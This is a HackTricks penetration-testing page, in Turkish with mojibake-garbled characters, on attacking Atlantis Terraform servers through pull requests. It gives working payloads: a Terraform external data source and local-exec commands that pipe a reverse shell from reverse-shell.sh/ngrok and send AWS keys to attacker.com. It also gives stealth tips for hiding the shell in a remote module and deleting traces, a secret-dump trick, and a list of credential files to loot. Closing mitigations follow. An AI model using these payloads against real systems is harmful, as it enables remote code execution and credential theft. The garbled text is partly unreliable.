# Atlantis Security

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n,** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek.

</details>
{% endhint %}

### Temel Bilgiler

Atlantis, temel olarak git sunucunuzdan Pull Request'lerden terraform Ã§alÄ±ÅŸtÄ±rmanÄ±za yardÄ±mcÄ± olur.

![](<../.gitbook/assets/image (161).png>)

### Yerel Laboratuvar

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) adresindeki **atlantis sÃ¼rÃ¼mleri sayfasÄ±na** gidin ve size uygun olanÄ± **indirin**.
2. **github** kullanÄ±cÄ±nÄ±z iÃ§in bir **kiÅŸisel token** (repo eriÅŸimi ile) oluÅŸturun.
3. `./atlantis testdrive` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n ve **atlantis ile konuÅŸmak iÃ§in** kullanabileceÄŸiniz bir **demo repo** oluÅŸturacaktÄ±r.
4. Web sayfasÄ±na 127.0.0.1:4141 adresinden eriÅŸebilirsiniz.

### Atlantis EriÅŸimi

#### Git Sunucu Kimlik Bilgileri

**Atlantis**, **Github**, **Gitlab**, **Bitbucket** ve **Azure DevOps** gibi birkaÃ§ git sunucusunu destekler.\
Ancak, bu platformlardaki repo'lara eriÅŸmek ve iÅŸlemler gerÃ§ekleÅŸtirmek iÃ§in bazÄ± **ayrÄ±calÄ±klÄ± eriÅŸimlerin verilmesi** gerekir (en azÄ±ndan yazma izinleri).\
[**Belgeler**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional), Atlantis iÃ§in bu platformlarda Ã¶zel bir kullanÄ±cÄ± oluÅŸturulmasÄ±nÄ± teÅŸvik eder, ancak bazÄ± insanlar kiÅŸisel hesaplar kullanabilir.

{% hint style="warning" %}
Her durumda, bir saldÄ±rgan perspektifinden, **Atlantis hesabÄ±** Ã§ok **ilginÃ§** bir **hedef** olacaktÄ±r.
{% endhint %}

#### Webhook'lar

Atlantis, Git sunucunuzdan aldÄ±ÄŸÄ± **webhook'larÄ±n** **geÃ§erli** olduÄŸunu doÄŸrulamak iÃ§in isteÄŸe baÄŸlÄ± olarak [**Webhook gizli anahtarlarÄ±**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) kullanÄ±r.

Bunu doÄŸrulamanÄ±n bir yolu, **isteklerin yalnÄ±zca Git sunucunuzun IP'lerinden gelmesine izin vermek** olacaktÄ±r, ancak daha kolay bir yol Webhook Gizli AnahtarÄ± kullanmaktÄ±r.

Ã–zel bir github veya bitbucket sunucusu kullanmadÄ±ÄŸÄ±nÄ±z sÃ¼rece, webhook uÃ§ noktalarÄ±nÄ± internete aÃ§manÄ±z gerekeceÄŸini unutmayÄ±n.

{% hint style="warning" %}
Atlantis, git sunucusunun bilgi gÃ¶nderebilmesi iÃ§in **webhook'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karacak**. Bir saldÄ±rgan perspektifinden, **ona mesaj gÃ¶nderip gÃ¶nderemeyeceÄŸinizi** bilmek ilginÃ§ olacaktÄ±r.
{% endhint %}

#### SaÄŸlayÄ±cÄ± Kimlik Bilgileri <a href="#provider-credentials" id="provider-credentials"></a>

[Belgelerden:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis, sunucuda **`terraform plan` ve `apply`** komutlarÄ±nÄ± basitÃ§e **Ã§alÄ±ÅŸtÄ±rarak** Terraform'u Ã§alÄ±ÅŸtÄ±rÄ±r. Yerel olarak Terraform Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda olduÄŸu gibi, Atlantis'in belirli saÄŸlayÄ±cÄ±nÄ±z iÃ§in kimlik bilgilerine ihtiyacÄ± vardÄ±r.

Atlantis'e belirli saÄŸlayÄ±cÄ±nÄ±z iÃ§in [kimlik bilgilerini nasÄ±l saÄŸladÄ±ÄŸÄ±nÄ±z](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) size kalmÄ±ÅŸ:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ve [AWS Fargate ModÃ¼lÃ¼](https://www.runatlantis.io/docs/deployment.html#aws-fargate) kendi kimlik bilgileri mekanizmalarÄ±na sahiptir. Belgelerini okuyun.
* Atlantis'i bir bulutta Ã§alÄ±ÅŸtÄ±rÄ±yorsanÄ±z, birÃ§ok bulut, Ã¼zerinde Ã§alÄ±ÅŸan uygulamalara bulut API eriÅŸimi saÄŸlama yollarÄ±na sahiptir, Ã¶rneÄŸin:
* [AWS EC2 Rolleri](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Arama "EC2 RolÃ¼")
* [GCE Instance Service HesaplarÄ±](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* BirÃ§ok kullanÄ±cÄ±, Atlantis'in Ã§alÄ±ÅŸtÄ±ÄŸÄ± yerde ortam deÄŸiÅŸkenleri ayarlar, Ã¶rn. `AWS_ACCESS_KEY`.
* DiÄŸerleri, Atlantis'in Ã§alÄ±ÅŸtÄ±ÄŸÄ± yerde gerekli yapÄ±landÄ±rma dosyalarÄ±nÄ± oluÅŸturur, Ã¶rn. `~/.aws/credentials`.
* SaÄŸlayÄ±cÄ± kimlik bilgilerini elde etmek iÃ§in [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) kullanÄ±n.

{% hint style="warning" %}
**Atlantis'in** **Ã§alÄ±ÅŸtÄ±ÄŸÄ±** **konteyner**, muhtemelen Atlantis'in Terraform aracÄ±lÄ±ÄŸÄ±yla yÃ¶nettiÄŸi saÄŸlayÄ±cÄ±lara (AWS, GCP, Github...) ait **ayrÄ±calÄ±klÄ± kimlik bilgilerini** iÃ§erecektir.
{% endhint %}

#### Web SayfasÄ±

VarsayÄ±lan olarak Atlantis, **localhost'ta 4141 portunda bir web sayfasÄ± Ã§alÄ±ÅŸtÄ±racaktÄ±r**. Bu sayfa, yalnÄ±zca atlantis apply'i etkinleÅŸtirmenize/devre dÄ±ÅŸÄ± bÄ±rakmanÄ±za ve repo'larÄ±n plan durumunu kontrol etmenize ve kilidini aÃ§manÄ±za izin verir (deÄŸiÅŸiklik yapmanÄ±za izin vermez, bu yÃ¼zden Ã§ok faydalÄ± deÄŸildir).

Muhtemelen internete aÃ§Ä±lmÄ±ÅŸ olarak bulamayacaksÄ±nÄ±z, ancak varsayÄ±lan olarak **eriÅŸim iÃ§in kimlik bilgisi gerekmediÄŸi** gÃ¶rÃ¼nmektedir (ve eÄŸer gerekiyorsa `atlantis`:`atlantis` **varsayÄ±lan** olanlardÄ±r).

### Sunucu YapÄ±landÄ±rmasÄ±

`atlantis server` yapÄ±landÄ±rmasÄ±, komut satÄ±rÄ± bayraklarÄ±, ortam deÄŸiÅŸkenleri, bir yapÄ±landÄ±rma dosyasÄ± veya bunlarÄ±n bir karÄ±ÅŸÄ±mÄ± aracÄ±lÄ±ÄŸÄ±yla belirtilebilir.

* Atlantis sunucusu tarafÄ±ndan desteklenen [**bayraklarÄ±n listesini burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
* Bir yapÄ±landÄ±rma seÃ§eneÄŸini bir ortam deÄŸiÅŸkenine dÃ¶nÃ¼ÅŸtÃ¼rmenin [**yolunu burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

DeÄŸerler **bu sÄ±rayla seÃ§ilir**:

1. Bayraklar
2. Ortam DeÄŸiÅŸkenleri
3. YapÄ±landÄ±rma DosyasÄ±

{% hint style="warning" %}
YapÄ±landÄ±rmada, **tokenlar ve ÅŸifreler** gibi ilginÃ§ deÄŸerler bulabileceÄŸinizi unutmayÄ±n.
{% endhint %}

#### Repo YapÄ±landÄ±rmasÄ±

BazÄ± yapÄ±landÄ±rmalar, **repo'larÄ±n nasÄ±l yÃ¶netildiÄŸini** etkiler. Ancak, **her repo'nun farklÄ± ayarlar gerektirmesi** mÃ¼mkÃ¼ndÃ¼r, bu nedenle her repo'yu belirtmenin yollarÄ± vardÄ±r. Ã–ncelik sÄ±rasÄ± ÅŸudur:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) dosyasÄ±. Bu dosya, atlantis'in repo'yu nasÄ±l ele almasÄ± gerektiÄŸini belirtmek iÃ§in kullanÄ±labilir. Ancak, varsayÄ±lan olarak bazÄ± anahtarlarÄ±n burada belirtilmesine izin verilmez.
2. Muhtemelen `allowed_overrides` veya `allow_custom_workflows` gibi bayraklarla izin verilmesi gerekir.
3. [**Sunucu TarafÄ± YapÄ±landÄ±rmasÄ±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): `--repo-config` bayraÄŸÄ± ile geÃ§irebilirsiniz ve bu, her repo iÃ§in yeni ayarlarÄ± yapÄ±landÄ±ran bir yaml'dÄ±r (regex desteklenir).
4. **VarsayÄ±lan** deÄŸerler.

**PR Koruma**

Atlantis, **PR**'nin bir baÅŸkasÄ± tarafÄ±ndan **`onaylanmasÄ±nÄ±`** (bu, dal korumasÄ±nda ayarlanmamÄ±ÅŸ olsa bile) ve/veya **`birleÅŸtirilebilir`** (dal korumalarÄ± geÃ§ildi) olmasÄ±nÄ± belirtmenize izin verir **apply Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce**. GÃ¼venlik aÃ§Ä±sÄ±ndan, her iki seÃ§eneÄŸi de ayarlamak Ã¶nerilir.

`allowed_overrides` True olduÄŸunda, bu ayarlar **her projede `/atlantis.yml` dosyasÄ± ile** **Ã¼stÃ¼ kapatÄ±labilir**.

**Betikler**

Repo yapÄ±landÄ±rmasÄ±, bir **iÅŸ akÄ±ÅŸÄ± yÃ¼rÃ¼tÃ¼lmeden Ã¶nce** [**Ã§alÄ±ÅŸtÄ±rÄ±lacak betikleri**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_Ã¶n iÅŸ akÄ±ÅŸÄ± kancalarÄ±_) ve [**sonrasÄ±nda**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_son iÅŸ akÄ±ÅŸÄ± kancalarÄ±_) **belirleyebilir.**

Bu betikleri **repo `/atlantis.yml`** dosyasÄ±nda **belirlemeye** izin veren herhangi bir seÃ§enek yoktur.

**Ä°ÅŸ AkÄ±ÅŸÄ±**

Repo yapÄ±landÄ±rmasÄ±nda (sunucu tarafÄ± yapÄ±landÄ±rmasÄ±), [**yeni bir varsayÄ±lan iÅŸ akÄ±ÅŸÄ± belirtebilirsiniz**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) veya [**yeni Ã¶zel iÅŸ akÄ±ÅŸlarÄ± oluÅŸturabilirsiniz**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** AyrÄ±ca, **hangi repo'larÄ±n** oluÅŸturulan **yeni** iÅŸ akÄ±ÅŸlarÄ±na **eriÅŸebileceÄŸini** **belirtebilirsiniz.**\
Daha sonra, her repo'nun **atlantis.yaml** dosyasÄ±nÄ±n **kullanÄ±lacak iÅŸ akÄ±ÅŸÄ±nÄ± belirtmesine** izin verebilirsiniz.

{% hint style="danger" %}
EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allow_custom_workflows` **True** olarak ayarlanmÄ±ÅŸsa, iÅŸ akÄ±ÅŸlarÄ± her repo'nun **`atlantis.yaml`** dosyasÄ±nda **belirlenebilir**. AyrÄ±ca, **`allowed_overrides`**'Ä±n **`workflow`**'u da **Ã¼stÃ¼ kapatmasÄ±** gerekebilir.\
Bu, temelde **Atlantis sunucusunda bu repo'ya eriÅŸebilen herhangi bir kullanÄ±cÄ±ya RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Conftest Politika KontrolÃ¼**

Atlantis, plan Ã§Ä±ktÄ±sÄ±na karÅŸÄ± **sunucu tarafÄ±nda** [**conftest**](https://www.conftest.dev/) **politikalarÄ±nÄ±n** Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± destekler. Bu adÄ±mÄ± kullanmanÄ±n yaygÄ±n kullanÄ±m senaryolarÄ± ÅŸunlardÄ±r:

* Bir modÃ¼l listesinin kullanÄ±mÄ±nÄ± reddetmek
* Bir kaynaÄŸÄ±n oluÅŸturulma zamanÄ±ndaki niteliklerini doÄŸrulamak
* Ä°stemeden kaynak silmelerini yakalamak
* GÃ¼venlik risklerini Ã¶nlemek (yani, gÃ¼venli portlarÄ± halka aÃ§mak)

Bunu nasÄ±l yapÄ±landÄ±racaÄŸÄ±nÄ±zÄ± [**belgelere**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) bakarak kontrol edebilirsiniz.

### Atlantis KomutlarÄ±

[**Belgelere**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) bakarak Atlantis'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabileceÄŸiniz seÃ§enekleri bulabilirsiniz:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### SaldÄ±rÄ±lar

{% hint style="warning" %}
EÄŸer istismar sÄ±rasÄ±nda bu **hata** ile karÅŸÄ±laÅŸÄ±rsanÄ±z: `Error: Error acquiring the state lock`

Bunu Ã§alÄ±ÅŸtÄ±rarak dÃ¼zeltebilirsiniz:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Yeni PR'de yapÄ±landÄ±rma deÄŸiÅŸikliÄŸi

Bir depoya yazma eriÅŸiminiz varsa, Ã¼zerinde yeni bir dal oluÅŸturabilir ve bir PR oluÅŸturabilirsiniz. EÄŸer **`atlantis plan`** komutunu **Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z (ya da belki otomatik olarak Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yorsa)**, **Atlantis sunucusunda RCE yapabilirsiniz**.

Bunu, [**Atlantis'in harici bir veri kaynaÄŸÄ±nÄ± yÃ¼klemesini saÄŸlayarak**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) yapabilirsiniz. `main.tf` dosyasÄ±na aÅŸaÄŸÄ±daki gibi bir yÃ¼k yerleÅŸtirin:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Gizli SaldÄ±rÄ±**

Bu saldÄ±rÄ±yÄ± daha **gizli bir ÅŸekilde** gerÃ§ekleÅŸtirebilirsiniz, bu Ã¶nerileri takip ederek:

* Rev shell'i doÄŸrudan terraform dosyasÄ±na eklemek yerine, rev shell'i iÃ§eren **harici bir kaynaÄŸÄ±** **yÃ¼kleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* DÄ±ÅŸ kaynakta, **ref** Ã¶zelliÄŸini kullanarak **repo iÃ§indeki bir dalda terraform rev shell kodunu gizleyin**, ÅŸÃ¶yle bir ÅŸey: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* Atlantis'i tetiklemek iÃ§in **master'a bir PR oluÅŸturmak yerine**, **2 dal oluÅŸturun** (test1 ve test2) ve birinden diÄŸerine **PR oluÅŸturun**. SaldÄ±rÄ±yÄ± tamamladÄ±ktan sonra, sadece **PR'yi ve dallarÄ± kaldÄ±rÄ±n**.

#### Atlantis plan Gizli Bilgileri DÃ¶kÃ¼mÃ¼

Terraform dosyasÄ±na ÅŸÃ¶yle bir ÅŸey koyarak `atlantis plan` (`terraform plan`) Ã§alÄ±ÅŸtÄ±rarak **terraform tarafÄ±ndan kullanÄ±lan gizli bilgileri dÃ¶kebilirsiniz**:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Yeni PR'de KonfigÃ¼rasyon DeÄŸiÅŸikliÄŸi

Bir depoya yazma eriÅŸiminiz varsa, Ã¼zerinde yeni bir dal oluÅŸturabilir ve bir PR oluÅŸturabilirsiniz. EÄŸer **`atlantis apply` komutunu Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z, Atlantis sunucusunda RCE gerÃ§ekleÅŸtirebilirsiniz**.

Ancak genellikle bazÄ± korumalarÄ± aÅŸmanÄ±z gerekecektir:

* **BirleÅŸtirilebilir**: EÄŸer bu koruma Atlantis'te ayarlanmÄ±ÅŸsa, yalnÄ±zca **PR birleÅŸtirilebilir olduÄŸunda `atlantis apply` Ã§alÄ±ÅŸtÄ±rabilirsiniz** (bu, dal korumasÄ±nÄ±n aÅŸÄ±lmasÄ± gerektiÄŸi anlamÄ±na gelir).
* Potansiyel [**dal koruma aÅŸmalarÄ±**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md) kontrol edin.
* **OnaylÄ±**: EÄŸer bu koruma Atlantis'te ayarlanmÄ±ÅŸsa, `atlantis apply` komutunu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce **baÅŸka bir kullanÄ±cÄ±nÄ±n PR'yi onaylamasÄ± gerekir**.
* VarsayÄ±lan olarak, bu korumayÄ± aÅŸmak iÃ§in [**Gitbot token'Ä±nÄ± kullanabilirsiniz**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md).

KÃ¶tÃ¼ niyetli bir Terraform dosyasÄ±nda **`terraform apply` Ã§alÄ±ÅŸtÄ±rmak** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Sadece `main.tf` dosyasÄ±nÄ±n sonunda aÅŸaÄŸÄ±daki gibi bir yÃ¼kÃ¼n bulunduÄŸundan emin olmalÄ±sÄ±nÄ±z:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ã–nceki teknikten **Ã¶nerileri takip ederek** bu saldÄ±rÄ±yÄ± **gizli bir ÅŸekilde** gerÃ§ekleÅŸtirin.

#### Terraform Param Injection

`atlantis plan` veya `atlantis apply` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda terraform altÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r, atlantis'ten terraform'a komutlar geÃ§irebilirsiniz, ÅŸÃ¶yle bir ÅŸey yorumlayarak:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Bir ÅŸey geÃ§irebileceÄŸiniz env deÄŸiÅŸkenleri, bazÄ± korumalarÄ± aÅŸmanÄ±za yardÄ±mcÄ± olabilir. Terraform env deÄŸiÅŸkenlerini [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables) adresinde kontrol edin.

#### Ã–zel Ä°ÅŸ AkÄ±ÅŸÄ±

Bir `atlantis.yaml` dosyasÄ±nda belirtilen **kÃ¶tÃ¼ niyetli Ã¶zel derleme komutlarÄ±nÄ±** Ã§alÄ±ÅŸtÄ±rmak. Atlantis, pull request dalÄ±ndan **`atlantis.yaml`** dosyasÄ±nÄ± kullanÄ±r, **master**'dan deÄŸil.\
Bu olasÄ±lÄ±k daha Ã¶nceki bir bÃ¶lÃ¼mde belirtilmiÅŸtir:

{% hint style="danger" %}
EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allow_custom_workflows` **True** olarak ayarlandÄ±ysa, iÅŸ akÄ±ÅŸlarÄ± her repo iÃ§in **`atlantis.yaml`** dosyasÄ±nda **belirtilmiÅŸ** olabilir. AyrÄ±ca, kullanÄ±lacak iÅŸ akÄ±ÅŸÄ±nÄ± **geÃ§ersiz kÄ±lmak iÃ§in** **`allowed_overrides`**'Ä±n da **`workflow`**'u belirtmesi potansiyel olarak gereklidir.

Bu, temelde **o repoya eriÅŸebilen herhangi bir kullanÄ±cÄ±ya Atlantis sunucusunda RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Plan/apply korumalarÄ±nÄ± atlama

EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allowed_overrides` _ÅŸu ÅŸekilde_ `apply_requirements` yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bir repo **plan/apply korumalarÄ±nÄ± deÄŸiÅŸtirebilir ve bunlarÄ± atlayabilir**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

EÄŸer biri **`atlantis plan/apply` yorumlarÄ± geÃ§erli pull request'lerinize gÃ¶nderirse,** bu terraform'un istemediÄŸiniz bir zamanda Ã§alÄ±ÅŸmasÄ±na neden olur.

AyrÄ±ca, eÄŸer **branch protection** ayarlarÄ±nda **yeni bir commit gÃ¶nderildiÄŸinde** her PR'nin **yeniden deÄŸerlendirilmesini** istemiyorsanÄ±z, biri terraform konfigÃ¼rasyonuna **kÃ¶tÃ¼ niyetli yapÄ±landÄ±rmalar** yazabilir (Ã¶nceki senaryolara bakÄ±n), `atlantis plan/apply` Ã§alÄ±ÅŸtÄ±rabilir ve RCE elde edebilir.

Bu, Github branch koruma ayarÄ±ndaki **ayar**dÄ±r:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

EÄŸer kullanÄ±lan **webhook secret'Ä± Ã§almayÄ±** baÅŸarÄ±rsanÄ±z veya **hiÃ§bir webhook secret** kullanÄ±lmÄ±yorsa, **Atlantis webhook'unu Ã§aÄŸÄ±rabilir** ve **atlantis komutlarÄ±nÄ±** doÄŸrudan Ã§alÄ±ÅŸtÄ±rabilirsiniz.

#### Bitbucket

Bitbucket Cloud **webhook secret'larÄ±nÄ± desteklememektedir**. Bu, saldÄ±rganlarÄ±n **Bitbucket'tan gelen istekleri taklit etmesine** olanak tanÄ±yabilir. Sadece Bitbucket IP'lerine izin verdiÄŸinizden emin olun.

* Bu, bir **saldÄ±rganÄ±n** **Atlantis'e** Bitbucket'tan geliyormuÅŸ gibi gÃ¶rÃ¼nen **sahte istekler** gÃ¶nderebileceÄŸi anlamÄ±na gelir.
* EÄŸer `--repo-allowlist` belirtiyorsanÄ±z, yalnÄ±zca o reposuna ait sahte istekler yapabilirler, bu nedenle verebilecekleri en bÃ¼yÃ¼k zarar kendi reposunuzda plan/apply yapmak olacaktÄ±r.
* Bunu Ã¶nlemek iÃ§in [Bitbucket'Ä±n IP adreslerini](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) beyaz listeye alÄ±n (Ã‡Ä±kÄ±ÅŸ IPv4 adreslerine bakÄ±n).

### Post-Exploitation

EÄŸer sunucuya eriÅŸim saÄŸladÄ±ysanÄ±z veya en azÄ±ndan bir LFI elde ettiyseniz, okumanÄ±z gereken bazÄ± ilginÃ§ ÅŸeyler var:

* `/home/atlantis/.git-credentials` VCS eriÅŸim kimlik bilgilerini iÃ§erir
* `/atlantis-data/atlantis.db` Daha fazla bilgi ile birlikte VCS eriÅŸim kimlik bilgilerini iÃ§erir
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform durum dosyasÄ±
* Ã–rnek: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Ã‡evre deÄŸiÅŸkenleri
* `/proc/[2-20]/cmdline` `atlantis server` komut satÄ±rÄ± (hassas veriler iÃ§erebilir)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Herkesin kamuya aÃ§Ä±k pull request'lere yorum yapabileceÄŸi iÃ§in, mevcut tÃ¼m gÃ¼venlik Ã¶nlemleriyle bile, Atlantis'i kamuya aÃ§Ä±k reposlarda uygun gÃ¼venlik ayarlarÄ± olmadan Ã§alÄ±ÅŸtÄ±rmak hala tehlikelidir.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

EÄŸer kamuya aÃ§Ä±k bir repoda Ã§alÄ±ÅŸÄ±yorsanÄ±z (bu Ã¶nerilmez, yukarÄ±ya bakÄ±n) `--allow-fork-prs` ayarÄ±nÄ± yapmamalÄ±sÄ±nÄ±z (varsayÄ±lan olarak false) Ã§Ã¼nkÃ¼ herkes kendi fork'undan sizin repoya bir pull request aÃ§abilir.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis, `--repo-allowlist` bayraÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla kabul edeceÄŸi repolarÄ±n bir beyaz listesini belirtmenizi gerektirir. Ã–rneÄŸin:

* Belirli repolar: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* TÃ¼m organizasyonunuz: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise kurulumunuzdaki her repo: `--repo-allowlist=github.yourcompany.com/*`
* TÃ¼m repolar: `--repo-allowlist=*`. Korunan bir aÄŸda olduÄŸunuzda yararlÄ±dÄ±r ama bir webhook secret'Ä± ayarlamadan tehlikelidir.

Bu bayrak, Atlantis kurulumunuzun kontrol etmediÄŸiniz repolarla kullanÄ±lmadÄ±ÄŸÄ±ndan emin olur. Daha fazla bilgi iÃ§in `atlantis server --help` komutuna bakÄ±n.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

EÄŸer saldÄ±rganlarÄ±n kÃ¶tÃ¼ niyetli Terraform kodu ile pull request gÃ¶ndermesi tehdit modelinizde varsa, `terraform apply` onaylarÄ±nÄ±n yeterli olmadÄ±ÄŸÄ±nÄ± bilmelisiniz. [`external` veri kaynaÄŸÄ±nÄ±](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) kullanarak veya kÃ¶tÃ¼ niyetli bir saÄŸlayÄ±cÄ± belirterek `terraform plan` iÃ§inde kÃ¶tÃ¼ niyetli kod Ã§alÄ±ÅŸtÄ±rmak mÃ¼mkÃ¼ndÃ¼r. Bu kod, kimlik bilgilerinizi dÄ±ÅŸarÄ± sÄ±zdÄ±rabilir.

Bunu Ã¶nlemek iÃ§in ÅŸunlarÄ± yapabilirsiniz:

1. SaÄŸlayÄ±cÄ±larÄ± Atlantis imajÄ±na veya sunucusuna gÃ¶mÃ¼n ve Ã¼retimde Ã§Ä±kÄ±ÅŸÄ± reddedin.
2. SaÄŸlayÄ±cÄ± kayÄ±t protokolÃ¼nÃ¼ dahili olarak uygulayÄ±n ve kamuya aÃ§Ä±k Ã§Ä±kÄ±ÅŸÄ± reddedin, bÃ¶ylece kayÄ±t Ã¼zerinde yazma eriÅŸimine kimin sahip olduÄŸunu kontrol edersiniz.
3. [Sunucu tarafÄ± repo yapÄ±landÄ±rmanÄ±zÄ±](https://www.runatlantis.io/docs/server-side-repo-config.html)'nÄ±n `plan` adÄ±mÄ±nÄ±, yasaklÄ± saÄŸlayÄ±cÄ±lar veya veri kaynaklarÄ± veya izin verilmeyen kullanÄ±cÄ±lardan gelen PR'ler ile karÅŸÄ±laÅŸtÄ±racak ÅŸekilde deÄŸiÅŸtirin. Bu noktada ek doÄŸrulama da ekleyebilirsiniz, Ã¶rneÄŸin `plan`'Ä±n devam etmesine izin vermeden Ã¶nce PR'de "beÄŸeni" gerektirmek gibi. Conftest burada faydalÄ± olabilir.

